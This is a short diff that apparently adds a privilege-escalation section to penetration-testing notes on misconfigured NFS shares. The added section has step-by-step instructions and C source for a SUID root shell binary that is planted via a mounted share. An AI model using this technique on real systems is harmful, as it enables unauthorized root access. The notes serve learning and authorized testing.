@@ -43,3 +43,17 @@ ls -n target-NFS/mnt/nfs/
 ```
 
 
+# Possible Privesc.
+Create simple shell binary locally on remote system. Mount it to your attacking machine and set SUID on it. Now execute it on remote system with SUID to get root shell.
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+```
